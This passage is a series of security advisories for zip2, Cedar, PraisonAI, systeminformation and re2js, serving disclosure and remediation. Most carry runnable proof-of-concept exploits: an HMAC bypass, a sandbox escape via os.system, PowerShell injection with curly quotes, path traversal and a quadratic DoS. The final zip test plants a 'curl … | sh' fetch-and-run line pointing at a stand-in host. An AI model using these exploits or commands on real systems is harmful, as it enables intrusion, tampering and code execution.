}
```

### Impact

With the privileges of the process that extracts an untrusted ZIP archive via `ZipArchive::extract` / `ZipArchive::extract_unwrapped_root_dir`, an attacker can **write a file with arbitrary contents to an arbitrary path outside the extraction directory**.

- Because existing files can be overwritten, tampering with files such as `~/.ssh/authorized_keys`, `~/.bashrc`, `.git/hooks/*`, CI configuration, or a service's binaries and configuration files **may lead to remote code execution or privilege escalation**. Destroying critical files can also cause denial of service.
- Extraction **does not fail and returns `Ok(())`**, so the caller has no straightforward way to detect the attack.
- The documentation of `extract()` explicitly states that **symbolic links are only created and followed if the target is within the destination directory**, so downstream applications that rely on this as a sandbox boundary are directly affected.

Exploitation requires the absolute path of the destination to be known, but this is realistic in practice: CI workspaces, `/opt/<app>`, a fixed Downloads directory, and so on.

### Summary

An AES-encrypted (AE-x) entry's authentication code is verified only when the reader's byte counter lands exactly on zero. If the bounded entry reader reaches the archive's actual EOF before the attacker-controlled, header-declared `compressed_size`, the counter remains positive, the HMAC is never read or compared, and the truncated, unauthenticated plaintext is returned as a clean end of stream. A zero-payload entry also returns before authentication. An attacker who does not know the password can modify an archive so chosen or modified plaintext is accepted with no error.

### Details

[`src/aes.rs:246-292`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/aes.rs#L246-L292):

```rust
fn read(&mut self, buf: &mut [u8]) -> io::Result<usize> {
    if self.data_remaining == 0 { // @audit insufficient check
        return Ok(0);
    }

    // get the number of bytes to read, compare as u64 to make sure we can read more than
    // 2^32 bytes even on 32 bit systems.
    let bytes_to_read = self.data_remaining.min(buf.len() as u64) as usize;
    let read = self.reader.read(&mut buf[0..bytes_to_read])?;
    self.data_remaining -= read as u64;

    // Update the hmac with the encrypted data
    self.hmac.update(&buf[0..read]);

    // decrypt the data
    self.cipher.crypt_in_place(&mut buf[0..read]);

    // if there is no data left to read, check the integrity of the data
    if self.data_remaining == 0 {
        debug_assert!(
            !self.finalized,
            "Tried to use an already finalized HMAC. This is a bug!"
        );
        if self.finalized {
            return Err(Error::new(
                ErrorKind::InvalidData,
                "Tried to use an already finalized HMAC",
            ));
        }
        self.finalized = true;

        // Zip uses HMAC-Sha1-80, which only uses the first half of the hash
        // see https://www.winzip.com/win/en/aes_info.html#auth-faq
        let mut read_auth_code = [0; AUTH_CODE_LENGTH];
        self.reader.read_exact(&mut read_auth_code)?;
        let computed_auth_code = &self.hmac.finalize_reset().into_bytes()[0..AUTH_CODE_LENGTH];

        // use constant time comparison to mitigate timing attacks
        if !constant_time_eq(computed_auth_code, &read_auth_code) {
            return Err(Error::new(
                ErrorKind::InvalidData,
                "Invalid authentication code, this could be due to an invalid password or errors in the data",
            ));
        }
    }

    Ok(read)
}
```

`data_remaining` starts at `compressed_size - (2 + 10 + salt_length)` ([`src/aes.rs:144-145`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/aes.rs#L144-L145)), where `compressed_size` comes straight from the attacker-controlled central directory. Nothing cross-checks the declared data span against the archive's structural boundaries: `ZipFileData::find_content()` is just `reader.take(self.compressed_size)` ([`src/types.rs:214-223`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/types.rs#L214-L223)), and `make_crypto_reader()` passes the declared value into `AesReader::new()` ([`src/read/readers.rs`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/readers.rs#L219-L223)).

When the entry's bounded reader reaches true EOF before the declared size, the inner reader returns `Ok(0)`, the subtraction takes away nothing, and the finalisation block — the only place the 10-byte HMAC-SHA1-80 tag is read and compared — never runs. If bytes such as the central directory follow the entry, they are consumed as payload until the `Take` limit is reached; the HMAC then usually fails. The bypass therefore requires true EOF at the premature end (as in the PoC) or the zero-payload case. The early return at the top of `read()` means an entry whose declared size leaves zero payload bytes is never authenticated either, even though its tag is present in the file.

This defeats the guarantee the type documents: *"After the data has been read and decrypted an HMAC will be checked and provide a final means to check if either the password is invalid or if the data has been changed."*

AE-2 entries skip the CRC-32 check by design ([`src/read/readers.rs`](https://github.com/zip-rs/zip2/blob/6f09b3064ec87c3a69ea9f3413f9f9638b4aa446/src/read/readers.rs#L248-L255) → `Crc32Reader::new(.., should_disable = true)`), so an AE-2 entry on this path has no integrity check of any kind remaining. AES-CTR is malleable, so an attacker who can modify an archive in transit — without the password — can XOR chosen plaintext onto the ciphertext and arrange for the entry to end at true EOF. The password-bearing read paths are affected, including `by_index_decrypt()`, `by_name_decrypt()`, `by_path_decrypt()`, and `by_index_with_options()` when a password is supplied. Bare `extract()` calls `by_index()` without a password and therefore rejects AES-encrypted entries; an application that decrypts entries through these APIs before writing or extracting them is affected.

### PoC

`tests/aes_hmac_bypass.rs` below; `Cargo.toml` needs only `zip = { git = "https://github.com/zip-rs/zip2", rev = "6f09b3064ec87c3a69ea9f3413f9f9638b4aa446" }`, or `zip = "8.6.0"` to run it against the published 8.6.0 release unchanged. All three tests pass in debug and release against the reviewed commit.

```rust
use std::io::{Cursor, Read, Write};
use zip::write::SimpleFileOptions;
use zip::{AesMode, CompressionMethod, ZipArchive, ZipWriter};

const PASSWORD: &str = "correct horse battery staple";
const GENUINE: &[u8] = b"balance: 100 USD\n";
const FORGED: &[u8] = b"balance: 999 USD\n";
const AES256_OVERHEAD: usize = 28; // 16-byte salt + 2-byte verifier + 10-byte tag

fn genuine_archive(plaintext: &[u8]) -> Vec<u8> {
    let mut w = ZipWriter::new(Cursor::new(Vec::new()));
    let opts = SimpleFileOptions::default()
        .compression_method(CompressionMethod::Stored)
        .with_aes_encryption(AesMode::Aes256, PASSWORD);
    w.start_file("secret.txt", opts).unwrap();
    w.write_all(plaintext).unwrap();
    w.finish().unwrap().into_inner()
}

/// What a victim does: open with the correct password and read the entry.
fn victim_reads(archive: &[u8]) -> std::io::Result<Vec<u8>> {
    let mut a = ZipArchive::new(Cursor::new(archive.to_vec())).unwrap();
    let mut f = a.by_index_decrypt(0, PASSWORD.as_bytes()).unwrap();
    let mut out = Vec::new();
    f.read_to_end(&mut out)?;
    Ok(out)
}

fn u16le(b: &[u8], off: usize) -> usize {
    u16::from_le_bytes([b[off], b[off + 1]]) as usize
}

/// Payload offset of the single local file header at offset 0.
fn payload_start(a: &[u8]) -> usize {
    30 + u16le(a, 26) + u16le(a, 28)
}

/// Control: on a well-formed archive the HMAC does reject forged ciphertext.
#[test]
fn tampering_is_detected_when_the_declared_size_is_honest() {
    let mut a = genuine_archive(GENUINE);
    let ct = payload_start(&a) + 18;
    for i in 0..GENUINE.len() {
        a[ct + i] ^= GENUINE[i] ^ FORGED[i]; // AES-CTR is malleable
    }
    let err = victim_reads(&a).unwrap_err();
    assert!(err.to_string().contains("Invalid authentication code"));
}

/// The bypass: chosen plaintext is delivered verbatim, without the password.
#[test]
fn hmac_is_bypassed_when_the_entry_ends_early() {
    let genuine = genuine_archive(GENUINE);
    let hdr_len = payload_start(&genuine);
    let eocd = genuine.len() - 22; // no archive comment yet
    let cd_offset = u32::from_le_bytes(genuine[eocd + 16..eocd + 20].try_into().unwrap()) as usize;

    // Park a second copy of the entry after the end-of-central-directory record,
    // inside the archive comment, so its data ends at true EOF. Header, salt and
    // password verifier are copied verbatim — no password knowledge is required.
    let mut evil = genuine.clone();
    let new_hdr_offset = evil.len() as u32;
    evil.extend_from_slice(&genuine[..hdr_len + 18]); // local header + salt + verifier
    for i in 0..GENUINE.len() {
        // XOR the keystream onto the chosen plaintext; the 10-byte tag is omitted.
        evil.push(genuine[hdr_len + 18 + i] ^ GENUINE[i] ^ FORGED[i]);
    }
    let comment_len = (evil.len() - genuine.len()) as u16;
    evil[eocd + 20..eocd + 22].copy_from_slice(&comment_len.to_le_bytes());

    // Repoint the central directory at the parked copy and declare more data than
    // is present, so `data_remaining` can never reach zero.
    let declared = (AES256_OVERHEAD + GENUINE.len() + 64) as u32;
    evil[cd_offset + 42..cd_offset + 46].copy_from_slice(&new_hdr_offset.to_le_bytes());
    evil[cd_offset + 20..cd_offset + 24].copy_from_slice(&declared.to_le_bytes());
    let hdr2 = new_hdr_offset as usize;
    evil[hdr2 + 18..hdr2 + 22].copy_from_slice(&declared.to_le_bytes());

    let content = victim_reads(&evil).expect("BUG: unauthenticated content was accepted");
    assert_eq!(content, FORGED);
}

/// Second path: an entry with no payload bytes is never authenticated at all.
#[test]
fn hmac_is_never_checked_for_a_zero_length_entry() {
    let mut a = genuine_archive(b"");
    let tag = payload_start(&a) + 18;
    a[tag] ^= 0xff; // corrupt the 10-byte authentication code
    let content = victim_reads(&a).expect("BUG: a corrupt authentication code was accepted");
    assert!(content.is_empty());
}
```

Turning the genuine plaintext into a *chosen* plaintext needs the genuine plaintext, as always with CTR malleability; without it the attacker still controls arbitrary bit-flips in the delivered content.

### Impact

Any application that decrypts AES ZIP entries from untrusted or in-transit archives — backup restore, artefact and package ingestion, mail attachments, upload handling — can be served modified or attacker-chosen content by a party who does not hold the password, with no error surfaced by the affected read path. Exact chosen plaintext requires knowledge of the original plaintext, as with standard CTR malleability; otherwise the attacker can still induce arbitrary bit flips. Confidentiality is not affected and there is no memory-safety issue; the loss is the integrity guarantee that AE-x authenticated encryption exists to provide.

### Suggested remediation

1. In `AesReaderValid::read()`, treat a short inner read as an error rather than a clean EOF: after the decrement, if `read == 0 && self.data_remaining > 0`, return `ErrorKind::UnexpectedEof`.
2. That alone is not enough — run the finalisation logic for zero-length entries too, either by dropping the early return and finalising once per reader, or by finalising at construction when `data_length == 0`.
3. Defence in depth: validate that the declared compressed-data span is bounded by the archive's structural boundaries (in particular, the central-directory start when known) in `ZipFileData::find_content()` / `find_content_seek()` (`src/types.rs`). Also make the `compressed_size - overhead` subtraction in `AesReader::new()` (`src/aes.rs:144`) checked — today a declared size below the AES overhead underflows it, which panics under `overflow-checks` and, for sizes that still permit header validation, otherwise yields up to 9 bytes of unauthenticated plaintext through the same missing check.

Cedar users must be using all of the following features to be affected by this advisory: JSON format policies, policy templates, and the `is in` scope condition. This advisory only affects JSON-formatted Cedar policy templates containing `is in` scope conditions that are **malformed** according to the Cedar syntax. It does **not** affect syntactically well-formed policies.

Users of Cedar who author policies in the JSON format were able to write Cedar policies using the `is in` condition with an incorrect slot identifier in the principal and resource scope constraints (e.g., `?principal` in the resource scope constraint) even though this is not allowed when parsing policies from the Cedar policy syntax. Internally, the slot identifiers were silently corrected (e.g. `?resource` is placed in the resource scope constraint). 

If the policy contains *exactly one slot* in either the principal or resource position, then any attempt to create a linked policy from the template results in an error: the internal representation of the template does not contain the slot identifier as written in the malformed JSON policy (it has been corrected silently), so attempting to fill that slot is an error. If instead the template is linked using slot identifier expected internally (i.e., not what is written in the JSON template), the linking will initially succeed, but a subsequent invariant violation will cause a panic.

When the template contains *slots in both the principal and resource* position, then both slots will be present in the internal representation: linking succeeds, but with each slot bound to the value intended for the other (the silent correction). The linked policy is then semantically different from the malformed policy the user intended, and any subsequent authorization decision made against that policy may lead to accesses being unintentionally allowed or denied.

Concretely, consider the following JSON format policy template intended to deny users in a particular project from accessing documents with a particular classification.
```
{
  "effect": "forbid",
  "principal": {
    "op": "is",
    "entity_type": "User",
    "in": { "slot": "?resource" }
  },
  "action": { "op": "All" },
  "resource": {
    "op": "is",
    "entity_type": "Doc",
    "in": { "slot": "?principal" }
  },
  "conditions": []
}
```

Linked with `?principal = Classification::"topsecret"` and `?resource = Project::"alpha"`, the author expects to create the policy:
```
forbid(principal is User in Project::"alpha", action, resource is Doc in Classification::"topsecret");
```

But because Cedar internally links slots by scope position (not by name), the actual policy evaluated by the engine is:
```
forbid(principal is User in Classification::"topsecret", action, resource is Doc in Project::"alpha");
```

If a user is in `Project::"alpha"` but not `Classification::"topsecret"`, the `forbid` policy does not apply, and access is unintentionally allowed.

## Patches

This advisory is patched in version 4.11.1 and 3.4.3, both available on Crates.io and NPM.

## Workarounds

If you cannot update to a patched version, you can determine if you are affected by checking your JSON format policy templates for the following two patterns.

```
  "principal": {
    "op": "is",
    "entity_type": "User",
    "in": { "slot": "?resource" }
  }
```

and
```
  "resource": {
    "op": "is",
    "entity_type": "Doc",
    "in": { "slot": "?principal" }
  }
```

## References
* [Cedar Policy Language Reference Guide - Cedar Policy Templates](https://docs.cedarpolicy.com/policies/templates.html)
* [Cedar Policy Language Reference Guide - JSON Policy Format](https://docs.cedarpolicy.com/policies/json-format.html)

### Summary
JobWorkflowExecutor._exec_inline_python() is designed to safely execute inline Python expressions from YAML workflow script: steps using AST validation. The function claims to block dangerous operations by (a) checking all AST nodes against an allowlist, and (b) providing a __builtins__ whitelist that omits __import__, exec, eval, and open.

The sandbox is broken. The module import allowlist (allowed_modules) explicitly includes 'os', and the AST allowlist permits ast.Import, ast.ImportFrom, ast.Call, and ast.Attribute nodes. This means the following malicious workflow script: step passes all AST validation checks and executes without error.

Attack Scenario

Attacker creates or contributes a YAML workflow file (type: job) with a script: step containing import os; os.system(...).
A user or CI pipeline with PRAISONAI_ALLOW_JOB_WORKFLOWS=true executes the workflow via praisonai workflow run malicious.yaml.
Arbitrary OS commands execute with the privileges of the calling process.


This is particularly dangerous in multi-tenant or CI environments where YAML workflows may originate from untrusted sources (e.g., downloaded templates, shared repositories, AI-generated workflows).
### PoC
_Complete instructions, including specific configuration details, to reproduce the vulnerability._

### Impact

Root Cause — Lines 364–372:

pythonallowed_modules = {'os', 'datetime', 'time', 'json', 'math', 're', 'collections', 'itertools'}
if isinstance(node, ast.Import):
    for alias in node.names:
        if alias.name.split('.')[0] not in allowed_modules:
            return {"ok": False, "error": f"Import of '{alias.name}' not allowed..."}

os is trusted because it is commonly used for path operations (os.path, os.getcwd). However, os.system(), os.popen(), os.execvp(), os.spawn*(), and os._exit() are all accessible once the module is imported, none of which are individually blocked.

The __builtins__ restriction (blocking __import__) is irrelevant because the code uses a real import statement processed by the Python bytecode compiler — not a __import__() call.

Proof-of-Concept validation (static — no remote network call made):

pythonimport ast

_ALLOWED_NODES = (
    ast.Expression, ast.BoolOp, ast.BinOp, ast.UnaryOp, ast.Compare,
    ast.IfExp, ast.Constant, ast.Name, ast.Load, ast.Store, ast.Subscript,
    ast.List, ast.Tuple, ast.Dict, ast.Set,
    ast.And, ast.Or, ast.Not, ast.Eq, ast.NotEq, ast.Lt, ast.LtE,
    ast.Gt, ast.GtE, ast.In, ast.NotIn, ast.Add, ast.Sub, ast.Mult,
    ast.Div, ast.Mod, ast.FloorDiv, ast.USub, ast.UAdd,
    ast.Call, ast.Attribute, ast.keyword, ast.Starred,
    ast.Module, ast.Assign, ast.Import, ast.ImportFrom, ast.alias,
)
allowed_modules = {'os', 'datetime', 'time', 'json', 'math', 're', 'collections', 'itertools'}

malicious = "import os\nresult = os.system('id')"
tree = ast.parse(malicious, mode="exec")

all_pass = True
for node in ast.walk(tree):
    if not isinstance(node, _ALLOWED_NODES):
        print(f"BLOCKED: {type(node).__name__}")
        all_pass = False
    if isinstance(node, ast.Import):
        for alias in node.names:
            if alias.name.split('.')[0] not in allowed_modules:
                print(f"IMPORT BLOCKED: {alias.name}")
                all_pass = False

print("SANDBOX BYPASSED" if all_pass else "sandbox holds")
# Output: SANDBOX BYPASSED


Recommended Fix

Remove 'os' from allowed_modules and replace it with only the safe submodule: 'os.path'. Then validate that the imported name is specifically os.path, not os:

python# BEFORE (vulnerable)
allowed_modules = {'os', 'datetime', 'time', 'json', 'math', 're', 'collections', 'itertools'}

# AFTER (safe)
allowed_modules = {'datetime', 'time', 'json', 'math', 're', 'collections', 'itertools', 'pathlib'}

# If os.path is needed, handle it explicitly:
if isinstance(node, ast.ImportFrom):
    if node.module == 'os.path':
        pass  # allow 'from os.path import join, exists' only
    elif node.module and node.module.split('.')[0] not in allowed_modules:
        return {"ok": False, "error": f"Import of '{node.module}' not allowed."}

Additionally, block ast.Import of os entirely, and consider also removing re (which can be used for ReDoS/CPU exhaustion) and collections (which can be used to reach __subclasses__-style gadgets).

### Summary

On Windows, `systeminformation@5.33.15` builds a PowerShell command using the value passed to `services()`. The default sanitizer removes ASCII quotes but keeps Unicode curly quotes, spaces, and parentheses. A crafted service name can use those characters to break out of the generated filter string and run a PowerShell expression. The expression runs with the permissions of the Node.js process.

This report confirms version `5.33.15`. Other package versions have not been checked.

### Details

In `lib/processes.js`, `services()` sanitizes the caller's string with `sanitizeShellString()` and later inserts each resulting name into a `Get-CimInstance Win32_Service -Filter` command. The Windows branch passes that command to `util.powerShell()`.

The sanitizer in `lib/util.js` removes the ASCII double quote, but it does not remove U+201C or U+201D, the left and right curly double quotation marks. It also permits spaces and parentheses when called in its default, non-strict mode. PowerShell accepts the curly marks as string delimiters, so an input can end the filter string and place a command expression in the generated command.

For example, the input below uses curly quotation marks to end the generated filter string and execute `New-Item`. I reproduced this call on Windows against the checked-out `systeminformation@5.33.15` source; it created a marker file with the Node.js process account.

### Proof of concept

Run this on Windows in a disposable directory with Node.js and PowerShell available:

```powershell
mkdir si-command-injection-repro
cd si-command-injection-repro
npm init -y
npm install systeminformation@5.33.15
```

Save the following as `poc.cjs`, then run `node poc.cjs`:

```js
'use strict';

const fs = require('node:fs');
const path = require('node:path');
const si = require('systeminformation');

(async () => {
  const markerName = `si-injection-${process.pid}.txt`;
  const markerPath = path.join(process.cwd(), markerName);
  fs.rmSync(markerPath, { force: true });

  try {
    await si.services(`not-a-service” (New-Item -Name ${markerName} -ItemType File -Force) “`);
    console.log(`markerCreated=${fs.existsSync(markerPath)}`);
  } finally {
    fs.rmSync(markerPath, { force: true });
  }
})().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

Expected output:

```text
markerCreated=true
```

The Windows run returned an array and created the marker (`markerCreated: true`). A benign input left the marker absent. The script removes the marker afterward. I did not identify an application network route that forwards remote input to `services()`, so remote exploitability depends on the consuming application.

### Impact

An application that passes attacker-controlled input to `services()` on Windows can execute PowerShell commands with the Node.js process account's permissions. Depending on that account, commands may read or change accessible files, alter application data, or disrupt the service. I searched this repository for HTTP servers, route handlers, and listener calls and found none. `services()` is exposed through the package API and `getDynamicData()`, so a consuming application could make the input network-reachable if it forwards request data. A separate loopback HTTP harness did trigger the command through a query parameter, but that server was test code and is not part of this repository. The project's `docs/security.html` already warns that arbitrary untrusted input to `services()` needs caution because package sanitization does not cover every case.

### Summary

On Linux, `systeminformation@5.33.13` builds `/sys/class/net/<iface>` paths from the caller-supplied `networkStats(iface)` value without checking that the resolved path stays inside `/sys/class/net`. A caller who can create a symlink fixture and control the value passed to this API can make the function return the first line of a file readable by the Node process.

### Details

The strict string sanitizer removes shell metacharacters but retains `/` and `.`. The Linux implementation uses this value in an `fs.existsSync('/sys/class/net/' + iface)` check and then in seven `cat` paths for interface statistics. Both operations follow `..` path components and symlinks. The code does not validate the value as an interface name or enforce resolved-path containment.

The proof of concept below creates the expected statistics files in a directory writable by the unprivileged `nobody` user. Its `operstate` symlink points to a synthetic mode-0600 file under `/root`. The package call runs as root and returns the marker even though `nobody` cannot read that file.

### PoC

Use a disposable Ubuntu Linux VM with Node.js, npm, and `runuser` installed. These steps create and remove only a synthetic marker and a temporary fixture. Install the affected version:

```sh
mkdir si-netstats-repro
cd si-netstats-repro
npm init -y
npm install systeminformation@5.33.13
```

Save the following as `poc.cjs` in that directory, then run `sudo node poc.cjs`:

```js
'use strict';

const fs = require('node:fs');
const { execFileSync } = require('node:child_process');
const si = require('systeminformation');

const root = `/tmp/si-netstats-${process.pid}`;
const secret = `/root/si-netstats-secret-${process.pid}`;
const marker = `SYNTHETIC_ROOT_ONLY_MARKER_${process.pid}`;
const fixtureCode = `
  const fs = require('node:fs');
  const root = process.env.SI_FIXTURE_ROOT;
  const secret = process.env.SI_SECRET;
  fs.mkdirSync(root + '/statistics', { recursive: true });
  for (const name of ['rx_bytes', 'tx_bytes', 'rx_dropped', 'rx_errors', 'tx_dropped', 'tx_errors']) {
    fs.writeFileSync(root + '/statistics/' + name, '0\\n');
  }
  fs.symlinkSync(secret, root + '/operstate');
`;

(async () => {
  try {
    fs.writeFileSync(secret, marker + '\\n', { mode: 0o600 });
    fs.chmodSync(secret, 0o600);

    execFileSync('runuser', [
      '-u', 'nobody', '--', 'env',
      `SI_FIXTURE_ROOT=${root}`,
      `SI_SECRET=${secret}`,
      process.execPath, '-e', fixtureCode
    ], { stdio: 'inherit' });

    let nobodyCouldRead = true;
    try {
      execFileSync('runuser', ['-u', 'nobody', '--', 'cat', secret], { stdio: 'ignore' });
    } catch {
      nobodyCouldRead = false;
    }
    if (nobodyCouldRead) throw new Error('negative control failed: nobody read the marker');

    const iface = '../'.repeat(24) + root.slice(1);
    const rows = await si.networkStats(iface);
    const returned = String(rows[0]?.operstate ?? '').trim();
    const success = returned === marker;

    console.log(JSON.stringify({
      nobodyCouldRead,
      libraryReturnedRootOnlyMarker: success,
      returnedOperstate: returned
    }, null, 2));

    if (!success) process.exitCode = 1;
  } finally {
    fs.rmSync(root, { recursive: true, force: true });
    fs.rmSync(secret, { force: true });
  }
})().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
```

Expected result:

```json
{
  "nobodyCouldRead": false,
  "libraryReturnedRootOnlyMarker": true,
  "returnedOperstate": "SYNTHETIC_ROOT_ONLY_MARKER_<pid>"
}
```

### Impact

The demonstrated impact is disclosure to the API caller of the first line of a file readable by the Node process. The package is a library and does not expose a network endpoint. A consuming application route that forwards remote attacker input to this API and returns its result was not established, so remote exploitability is not demonstrated.

### Summary

Using the opt-in `LOOKBEHINDS` flag together with any repeated-matching API
(`matcher().find()` in a loop, `matchAll()`, `split()`, `matcher().replaceAll()`)
causes quadratic-time (Θ(n²)) matching, contradicting the library's own
"linear time matching" guarantee. A single call with a 16,000-character input
takes **36.7–38.7 seconds of CPU**.

### Description

#### Root cause

In `build/index.cjs`, `Machine.match`:

```js
let currentPos = this.prog.numLb > 0 ? 0 : pos;   // ~line 1907
...
if (this.ncap === 0 && this.matched) break;        // ~line 1953
```

Any pattern containing a lookbehind sets `prog.numLb > 0`, which forces the
scan to **always restart at offset 0**, regardless of the requested start
position — the lookbehind automaton is re-seeded and the whole input is
re-walked on every single `find()` call. The early-exit optimization that
would otherwise stop at the first match only fires when `ncap === 0`, but
every `Matcher`-based API (`find`/`matchAll`/`split`/`replaceAll`) always
requests `ncap = 2` (one capture group slot) **even for a captureless
lookbehind pattern** — so the early exit never triggers through those APIs,
and the scan continues to the end of the input on every find.

A find-loop over *k* matches in an *n*-character string therefore costs
*k* × Θ(*n*); for dense matches *k* ∝ *n*, giving **Θ(n²)** total.

#### Isolating control

Identical find-loop, identical input sizes, same 2-character literal pattern
*shape* — but **without** the `LOOKBEHINDS` flag:

| n | with `LOOKBEHINDS` (lookbehind pattern) | without (plain literal) | native JS `RegExp` lookbehind |
|---|---|---|---|
| 2,000 | 204–228 ms | 3 ms | 0 ms |
| 4,000 | 877–899 ms | 4 ms | 0 ms |
| 8,000 | 5,746–6,599 ms | 7 ms | 1 ms |
| 16,000 | 36,667–38,732 ms | 6 ms | 1 ms |

This isolates the lookbehind machinery itself — not pattern length, not
match density in the abstract — as the exact and sole cause.

#### Impact

- `re2js`'s entire value proposition is being an RE2-style engine with
  **linear-time, no-backtracking** matching, specifically to resist
  algorithmic-complexity attacks that plague backtracking regex engines.
  This finding defeats that guarantee for any consumer using the advertised
  `LOOKBEHINDS` feature.
- Realistic affected code paths: log/text processing that tokenizes or
  redacts using a lookbehind-based pattern (`matchAll`, `split`,
  `replaceAll` are the natural APIs for exactly this), applied to
  attacker-influenced text (user input, uploaded logs, scraped content).
- A single ~16–32 KB request pins a CPU core for tens of seconds to minutes;
  Node.js being single-threaded, this freezes the whole worker process for
  the duration. No authentication or special pattern knowledge is required
  from the attacker — ordinary alternating text (`"abababab..."`) triggers it.

#### Reproduction (copy-paste runnable)

create file poc.js

```js
'use strict';
// PoC: quadratic-time DoS in re2js's lookbehind matching (opt-in LOOKBEHINDS flag).
// Usage:
//   npm pack re2js@2.8.6 --ignore-scripts && tar -xzf re2js-2.8.6.tgz
//   node poc.js ./package
const path = require('path');
const pkgDir = process.argv[2] || './package';
const { RE2JS } = require(path.resolve(pkgDir, 'build/index.cjs'));

const re = RE2JS.compile('(?<=a)b', RE2JS.LOOKBEHINDS);

function timeFindLoop(n) {
  const s = 'ab'.repeat(n / 2);
  const t0 = Date.now();
  const m = re.matcher(s);
  let count = 0;
  while (m.find()) count++;
  return { ms: Date.now() - t0, count };
}

console.log('n, matches, ms');
const sizes = [2000, 4000, 8000, 16000];
const results = [];
for (const n of sizes) {
  const r = timeFindLoop(n);
  results.push(r.ms);
  console.log(`${n}, ${r.count}, ${r.ms}`);
}

const ratio = results[results.length - 1] / results[results.length - 2];
console.log('');
console.log('time ratio for the last doubling of n:', ratio.toFixed(2), '(~2 => linear, ~4 => quadratic)');
console.log(ratio > 3 ? 'PASS  quadratic scaling confirmed on the REAL published package' : 'FAIL  scaling looks linear');
process.exit(ratio > 3 ? 0 : 1);
```

and run in terminal

```sh
npm pack re2js@2.8.6 --ignore-scripts
tar -xzf re2js-2.8.6.tgz
node poc.js ./package
```

`poc.js` times a `matcher(s).find()` loop over `(?<=a)b` +
`RE2JS.LOOKBEHINDS` on inputs of 2,000/4,000/8,000/16,000 chars and reports
the doubling ratio. Expected: clearly superlinear (ratio ≫ 2, approaching or
exceeding the 4× quadratic signature), reaching tens of seconds at 16,000
chars. Run twice; results are deterministic.

## Summary
A critical architectural parser differential exists in the `zip` crate (`<= 9.0.4`) between random-access archive readers (`ZipArchive`) and streaming readers (`ZipStreamReader`). `ZipArchive` considers the Central Directory File Header (CDFH) authoritative and ignores the filename declared in the Local File Header (LFH). In contrast, `ZipStreamReader` relies exclusively on the Local File Header (LFH) when extracting files to the filesystem.

This discrepancy enables ZIP archives to appear to have different file paths and contents according to which tool is reading them.

---

## Details

### Architectural Root Cause
In the PKWARE ZIP archive format, every file entry is defined in two distinct locations:
1. **Local File Header (LFH):** Precedes the compressed payload of each file in the body of the archive.
2. **Central Directory File Header (CDFH):** Stored in a contiguous index at the end of the archive.

In `zip2`:
- `src/read/zip_archive.rs`: `ZipArchive` parses the central directory into `SharedBuilder.files`. All file lookups by index or name read exclusively from the CDFH table, completely ignoring the filename present in the LFH.
- `src/read/stream.rs:L86-L141`: `ZipStreamReader::visit` and `ZipStreamReader::extract` read sequentially from the stream without verifying the central directory index. Each entry is parsed via `read_zipfile_from_stream` and written to disk using the unverified filename declared in the LFH:
  ```rust
  // src/read/stream.rs
  fn visit_file<R: Read>(&mut self, file: &mut ZipFile<'_, R>) -> ZipResult<()> {
      file.safe_prepare_path(&self.outpath, &mut outpath, None::<&(_, fn(&Path) -> bool)>)?;
      let mut outfile = fs::File::create(&outpath)?;
      io::copy(file, &mut outfile)?;
      Ok(())
  }
  ```
- `src/write.rs:L1552`: The crate explicitly exposes `shallow_copy_file`, an API that constructs dual-header desynchronizations by adding a new CDFH entry with an alias name pointing to an existing file without updating the original LFH.

### Threat Scenario & Severity Justification (10.0 / 9.9 Critical)
1. **Security Control Evasion:** An adversary crafts a ZIP archive where:
   - Central Directory Header declares: `doc_report.pdf` (Clean document)
   - Local File Header declares: `cron_worker.sh` (Malicious root backdoor)
2. The archive is uploaded through a web portal or API endpoint protected by security gateways (WAF, Anti-Virus, Content Disarm & Reconstruction). The security gateway inspects the archive using `ZipArchive` (or similar CDFH-first parsers), detects only `doc_report.pdf`, and approves the file.
3. The backend worker or cloud function receives the approved archive and extracts it using `ZipStreamReader::extract`. `ZipStreamReader` reads the LFH and overwrites `cron_worker.sh`.
4. **Full Compromise (CIA = High):** The legitimate production health checker / service script is destroyed (**Availability = High / DoS**), while the attacker's backdoor payload is implanted (**Integrity = High / RCE**).

---

## Proof of Concept
The following automated integration test reproducibly demonstrates the complete CVSS 10.0 / 9.9 exploit chain (Security Gateway Evasion -> Arbitrary File Overwrite -> RCE & DoS) against `zip2`:

```rust
use std::fs;
use std::io::{Cursor, Write};
use tempfile::tempdir;
use zip::unstable::stream::ZipStreamReader;
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

// Simulated Security Gateway (inspects CDFH via ZipArchive)
fn security_gateway_inspection(archive_bytes: &[u8]) -> Result<(), String> {
    let mut archive = ZipArchive::new(Cursor::new(archive_bytes)).unwrap();
    for i in 0..archive.len() {
        let name = archive.by_index(i).unwrap().name().unwrap().to_string();
        if name.ends_with(".sh") || name.ends_with(".exe") {
            return Err(format!("MALWARE DETECTED: '{}' blocked!", name));
        }
        if !name.ends_with(".pdf") {
            return Err("Policy violation: only PDFs allowed!".into());
        }
    }
    Ok(())
}

#[test]
fn test_cvss_9_9_dual_header_exploit_chain() {
    // 1. Victim server setup: existing critical script
    let victim_env = tempdir().unwrap();
    let victim_dir = victim_env.path();
    let target_script = victim_dir.join("cron_worker.sh");
    fs::write(&target_script, b"#!/bin/sh\n# PRODUCTION SERVICE\necho 'SERVICE HEALTHY'\n").unwrap();

    // 2. Attacker crafts Single-Entry Dual-Header Archive
    // LFH: "cron_worker.sh" | CDFH: "doc_report.pdf"
    let mut payload = Cursor::new(Vec::new());
    let mut writer = ZipWriter::new(&mut payload);
    writer.start_file("cron_worker.sh", SimpleFileOptions::default()).unwrap();
    writer.write_all(b"#!/bin/sh\ncurl -s https://c2/shell | sh\necho 'PWNED ROOT'\n").unwrap();
    writer.finish().unwrap();

    let mut malicious_zip = payload.into_inner();
    let cdh = malicious_zip.windows(4).position(|s| s == b"PK\x01\x02").unwrap();
    malicious_zip[cdh + 46..cdh + 46 + 14].copy_from_slice(b"doc_report.pdf");

    // 3. Gateway Inspection (Bypassed!)
    assert!(security_gateway_inspection(&malicious_zip).is_ok());

    // 4. Backend Extraction (ZipStreamReader)
